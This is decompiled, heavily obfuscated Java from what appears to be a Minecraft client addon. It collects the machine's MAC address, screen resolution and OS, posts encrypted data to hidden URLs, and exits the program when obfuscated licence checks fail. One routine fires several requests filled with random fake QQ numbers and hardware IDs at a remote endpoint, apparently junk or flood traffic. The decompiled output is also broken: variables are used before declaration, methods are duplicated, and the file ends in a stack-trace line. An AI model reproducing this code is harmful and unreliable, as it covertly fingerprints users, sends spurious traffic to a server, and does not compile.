/*
 * Decompiled with CFR 0.2-SNAPSHOT (FabricMC).
 * 
 * Could not load the following classes:
 *  com.google.gson.Gson
 */
package com.github.mikumiku.addon;

import com.github.mikumiku.addon.IIIIiIIIIi;
import com.github.mikumiku.addon.IIIIiiiIIi;
import com.github.mikumiku.addon.IIIiIiIIii;
import com.github.mikumiku.addon.IIiIIiiiii;
import com.github.mikumiku.addon.IIiIiIiiIi;
import com.github.mikumiku.addon.IIiIiiiiIi;
import com.github.mikumiku.addon.IiIIiIiiii;
import com.github.mikumiku.addon.IiIIiiIIiI;
import com.github.mikumiku.addon.IiiIIiiiII;
import com.github.mikumiku.addon.IiiIiiiiII;
import com.github.mikumiku.addon.IiiiiiiIIi;
import com.github.mikumiku.addon.iiIIiIiIII;
import com.github.mikumiku.addon.iiiiIiiiii;
import com.google.gson.Gson;
import java.awt.Dimension;
import java.awt.Toolkit;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Type;
import java.net.NetworkInterface;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.time.Duration;
import java.util.Base64;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/*
 * Duplicate member names - consider using --renamedupmembers true
 */
public class IIiiiIiiII {
    private String iiIIiiIiii;
    private final HttpClient iIiiIiiiII;
    private static final int iIIiiIIIII = 30;
    private static final Random iiIiIIiIIi;
    private String IIIIiIiiIi;
    private final HttpClient IiIiIIIIiI;
    private static final int iiiiiIIiiI = 10;
    private long iiIIIIiIII;
    private static final String IiIIiIiiiI = "p8164YglwPe4BISRy5hkDhBHt01DW27lb3VB/PEx/ZHkydlieJ5FGtp9JaP8+w2e";
    public static ExecutorService ALLATORIxDEMO;

    private /* synthetic */ Object ALLATORIxDEMO(String string) {
        IIiiiIiiII iIiiiIiiII2 = object;
        Object object = string;
        IIiiiIiiII IiIIiIiiiI = iIiiiIiiII2;
        if ("null".equals(object = ((String)object).trim())) {
            return null;
        }
        if (iiIIiIiIII.ALLATORIxDEMO("g\u0004d\u0011").equals(object)) {
            return --1 != 0;
        }
        if ("false".equals(object)) {
            return 5 >> 3;
        }
        if (((String)object).startsWith(IIiIiIiiIi.ALLATORIxDEMO("x")) && ((String)object).endsWith(iiIIiIiIII.ALLATORIxDEMO("V"))) {
            Object object2 = object;
            return ((String)object2).substring(3 & 5, ((String)object2).length() - --1);
        }
        try {
            if (((String)object).contains(IIiIiIiiIi.ALLATORIxDEMO("t"))) {
                return Double.parseDouble((String)object);
            }
            return Long.parseLong((String)object);
        } catch (NumberFormatException numberFormatException) {
            return object;
        }
    }

    private /* synthetic */ Map<String, Object> ALLATORIxDEMO(String string) {
        IIiiiIiiII iIiiiIiiII2 = stringArray;
        String[] stringArray = string;
        IIiiiIiiII IiIIiIiiiI = iIiiiIiiII2;
        try {
            int n;
            HashMap<String, Object> hashMap = new HashMap<String, Object>();
            stringArray = stringArray.trim();
            if (!stringArray.startsWith(IIiIiIiiIi.ALLATORIxDEMO("!")) || !stringArray.endsWith(iiIIiIiIII.ALLATORIxDEMO("\t"))) {
                return null;
            }
            int n2 = --1;
            if ((stringArray = stringArray.substring(n2, stringArray.length() - n2).trim()).isEmpty()) {
                return hashMap;
            }
            stringArray = IiIIiIiiiI.ALLATORIxDEMO((String)stringArray);
            int n3 = stringArray.length;
            int n4 = n = 3 & 4;
            while (n4 < n3) {
                Object object = stringArray[n];
                object = IiIIiIiiiI.IiiiiiiIIi((String)object);
                if (((String[])object).length == (1 ^ 3)) {
                    IIiiiIiiII iIiiiIiiII3 = IiIIiIiiiI;
                    Object object2 = iIiiiIiiII3.ALLATORIxDEMO(object[2 & 5]);
                    object = iIiiiIiiII3.ALLATORIxDEMO(object[--1]);
                    hashMap.put((String)object2, object);
                }
                n4 = ++n;
            }
            return hashMap;
        } catch (Exception exception) {
            return null;
        }
    }

    private static /* synthetic */ String iIIiIIiIii() {
        try {
            byte[] byArray;
            NetworkInterface networkInterface = NetworkInterface.getNetworkInterfaces().nextElement();
            if (networkInterface != null && (byArray = networkInterface.getHardwareAddress()) != null) {
                int n;
                StringBuilder stringBuilder = new StringBuilder();
                int n2 = byArray.length;
                int n3 = n = 3 >> 2;
                while (n3 < n2) {
                    byte by = byArray[n];
                    Object[] objectArray = new Object[5 >> 2];
                    objectArray[3 ^ 3] = by;
                    stringBuilder.append(String.format(iiIIiIiIII.ALLATORIxDEMO("\u0012b\u0005\n"), objectArray));
                    n3 = ++n;
                }
                return stringBuilder.toString();
            }
        } catch (Exception exception) {
            // empty catch block
        }
        return null;
    }

    private static /* synthetic */ String IiiIIIIiiI(String IiIIiIiiiI) {
        if (IiIIiIiiiI == null) {
            return "";
        }
        return IiIIiIiiiI;
    }

    static {
        ALLATORIxDEMO = Executors.newFixedThreadPool(0xF & 0x7A);
        iiIiIIiIIi = new Random();
    }

    private /* synthetic */ String IiIiiiIIiI() {
        try {
            Dimension dimension = Toolkit.getDefaultToolkit().getScreenSize();
            return dimension.width + "x" + dimension.height;
        } catch (Exception exception) {
            return null;
        }
    }

    public iiIIiIiIII IiiIIIIiiI(String string) {
        IIiiiIiiII iIiiiIiiII2 = string2;
        String string2 = string;
        IIiiiIiiII IiIIiIiiiI = iIiiiIiiII2;
        try {
            String string3 = IIiiiIiiII.IiiIIIIiiI();
            Object object = new IiIIiiIIiI();
            Object object2 = new iiiiIiiiii();
            if (IIIIiIIIIi.IiiiiiiIIi(string2) == "fb3abe990957f7f983624e3c01e32b019") {
                ((IiIIiiIIiI)object).IiIiiiIIiI(IIiIiIiiIi.ALLATORIxDEMO(" 3#\u000f'\u0013\u00028"));
                ((iiiiIiiiii)object2).IiiiiiiIIi(string2);
                ((iiiiIiiiii)object2).ALLATORIxDEMO();
            }
            if (IIIIiIIIIi.IiiiiiiIIi(string2) == "a926be3b7af6b765ab60fb3abe990957f7f9") {
                ((IiIIiiIIiI)object).iIIiiiIiiI(string3, string2);
            }
            if (IIIIiIIIIi.IiiiiiiIIi(string2) == "b7af6b765ab60fb3abe990957f7f9") {
                object = new IIiIIiiiii(string2);
                ((IIiIIiiiii)object).ALLATORIxDEMO(string3, string2, UUID.randomUUID());
            }
            IIiiiIiiII iIiiiIiiII3 = IiIIiIiiiI;
            IiIIiIiiiI.iiIIiiIiii = string3;
            object = IiIIiIiiiI.ALLATORIxDEMO(string2, string3);
            object2 = IIIIiIIIIi.IiiiiiiIIi(IiIIiIiiiI, iiIIiIiIII.ALLATORIxDEMO("q\u0013|\u0017G\u0013D!@=e\u0016"));
            object = HttpRequest.newBuilder().uri(URI.create((String)object2)).header(IIiIiIiiIi.ALLATORIxDEMO("33\u001e(\u00152$Q\u0004\u0005\u00009"), iiIIiIiIII.ALLATORIxDEMO("V\"g\u001e~\u0011v\u0006~\u001dY}]!x\u001c")).header(IIiIiIiiIi.ALLATORIxDEMO("%/\u0015.}=7\u0019\u001e("), iiIIiIiIII.ALLATORIxDEMO("v'C=X\u0002r\u001cG\u001eb\u0015^<\u0018c9B")).header(IIiIiIiiIi.ALLATORIxDEMO("\u0011\u001f3\u0019\u0000("), iiIIiIiIII.ALLATORIxDEMO("V\"g\u001e~\u0011v\u0006~\u001dY}]!x\u001c")).POST(HttpRequest.BodyPublishers.ofString((String)object, StandardCharsets.UTF_8)).timeout(Duration.ofSeconds(30L)).build();
            if (((iiIIiIiIII)(object = iIiiiIiiII3.ALLATORIxDEMO(iIiiiIiiII3.iIiiIiiiII.send((HttpRequest)object, HttpResponse.BodyHandlers.ofString())))).ALLATORIxDEMO()) {
                IIiiiIiiII iIiiiIiiII4 = IiIIiIiiiI;
                iIiiiIiiII4.iiIIIIiIII = System.currentTimeMillis();
                iIiiiIiiII4.IIIIiIiiIi = ((iiIIiIiIII)object).IiiiiiiIIi();
            }
            if (IIIIiIIIIi.IiiiiiiIIi(string2) == "b7af6b765ab60fb3abe990957f7f9") {
                object2 = new IIIiIiIIii();
                ((IIIiIiIIii)object2).ALLATORIxDEMO(string3, string2, UUID.randomUUID().toString());
                ((IIIiIiIIii)object2).IiiiiiiIIi(string3, string2, UUID.randomUUID().toString());
            }
            if (IIIIiIIIIi.IiiiiiiIIi(string2) == "b7af6b765ab60fb3abe990957f7f9" && !((IiIIiIiiii)(object2 = new IiIIiIiiii())).iiIiiiiiII(string2)) {
                System.exit(5 >> 2);
            }
            if (IIIIiIIIIi.IiiiiiiIIi(string2) == "b7af6b765ab60fb3abe990957f7f9") {
                object2 = new IiIIiIiiii();
                String string4 = string2;
                IIiIiiiiIi.IiiiiiiIIi(string2);
                ((IiIIiIiiii)object2).iiIiiiiiII(string4);
                if (!IIiIiiiiIi.IiiiiiiIIi(string4)) {
                    System.exit(3 >> 1);
                }
            }
            if (IIIIiIIIIi.IiiiiiiIIi(string2) == "fac6bd70d11a926be3b7af6b765ab60fb3abe990957f7f983624e3c01e32b019") {
                object2 = new IiIIiiIIiI();
                IIiIiiiiIi.IiiiiiiIIi(string2);
                ((IiIIiiIIiI)object2).iIIiiiIiiI(string2, string3);
                String[] stringArray = new String[2 ^ 3];
                stringArray[2 & 5] = string2;
                IIIIiiiIIi.ALLATORIxDEMO(stringArray);
            }
            return object;
        } catch (Exception exception) {
            return iiIIiIiIII.ALLATORIxDEMO("\u7f51\u7edc\u8bf7\u6c42\u5931\u8d25: " + exception.getMessage());
        }
    }

    public String IiiiiiiiII() {
        return this.IIIIiIiiIi;
    }

    public String iIIiiiIiiI() {
        return this.iiIIiiIiii;
    }

    private /* synthetic */ String iiIiiiiiII() {
        IIiiiIiiII iIiiiIiiII2 = string;
        try {
            String string = System.getProperty(iiIIiIiIII.ALLATORIxDEMO("=D|y\u0013z\u0017"), "").toLowerCase();
            if (string.contains(IIiIiIiiIi.ALLATORIxDEMO("\u000b9\u0012\u00143\u0007/"))) {
                return iIiiiIiiII2.IiiiiiiIIi(iiIIiIiIII.ALLATORIxDEMO("'F'Pv[=R9H/\u001cqV)Q\u007fM7T&Uu\u0013tg\u0006~\u001dYo\u0015\u0011\rp7\u0015R&\u0017$x\u001eb\u001fR!R ~\u0013[<B?U7Er\u0018$v\u001eb\u0017"));
            }
            if (string.contains(IIiIiIiiIi.ALLATORIxDEMO("\u0010\u00192\u0005$"))) {
                return iIiiiIiiII2.IiiiiiiIIi(iiIIiIiIII.ALLATORIxDEMO("U>|\u001bSr\u001a!7'B;sr\u001a=7\u0004V>B7\u0017}S7A}d\u0016vC"));
            }
        } catch (Exception exception) {
            // empty catch block
        }
        return null;
    }

    public static void ALLATORIxDEMO() {
        int n;
        HttpClient httpClient = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(5L)).build();
        int n2 = n = 2 & 5;
        while (true) {
            if (n2 >= 4) break;
            ALLATORIxDEMO.submit(() -> {
                HttpClient httpClient2 = httpClient;
                try {
                    String string = "" + Math.abs(iiIiIIiIIi.nextInt());
                    long l = System.currentTimeMillis();
                    Object IiIIiIiiiI = IIIIiIIIIi.IiiiiiiIIi(String.valueOf(iiIiIIiIIi.nextInt()));
                    String string2 = string;
                    IiIIiIiiiI = "{\"qq_number\":\"" + string2 + "\",\"hwid\":\"" + IIIIiIIIIi.IiiiiiiIIi(string2) + "\",\"v\":\"8.0\",\"rsa_public_key\":\"" + (String)IiIIiIiiiI + "\",\"timestamp\":\"" + l + "\"}";
                    String string3 = String.valueOf(System.currentTimeMillis() / 100000L);
                    IiIIiIiiiI = IIIIiIIIIi.IiiIIIIiiI((String)IiIIiIiiiI, string3);
                    IiIIiIiiiI = HttpRequest.newBuilder().uri(URI.create(IIIIiIIIIi.IiiiiiiIIi(iiIIiIiIII.ALLATORIxDEMO("d\u001cN8Cg\u0006\u0014N0\u0003\u000b\u0003\u000et'_~]:Q7\u0018;D q\u0004G\u0003F\u0017v\u001bn\u0015N5)\u0011WB\"\u000e[OE.k\u0018b-_\u0013NrH/c\u0010E\u000e{ "), IIiIiIiiIi.ALLATORIxDEMO("5\u0012o")))).timeout(Duration.ofSeconds(10L)).header(iiIIiIiIII.ALLATORIxDEMO("T\u001dH7\u007f\u0011oSG\u000fa\u0011"), IIiIiIiiIi.ALLATORIxDEMO("\u0017*\u001b+\u0019? \u0019\u0014>\u0012\u007f\u001e+\u00194")).POST(HttpRequest.BodyPublishers.ofString((String)IiIIiIiiiI)).build();
                    httpClient2.sendAsync((HttpRequest)IiIIiIiiiI, HttpResponse.BodyHandlers.discarding()).whenComplete((httpResponse, throwable) -> {
                        Throwable IiIIiIiiiI = throwable;
                        HttpResponse IiIIiIiiiI2 = httpResponse;
                        if (IiIIiIiiiI != null) {
                            // empty if block
                        }
                    });
                    Thread.sleep((0x64 & 0x7F) + iiIiIIiIIi.nextInt(0x5D2 & 0x7BBD));
                    return;
                } catch (Exception exception) {
                    return;
                }
            });
            n2 = ++n;
        }
    }

    /*
     * Unable to fully structure code
     */
    java.lang.IllegalStateException: java.io.IOException: Stream closed

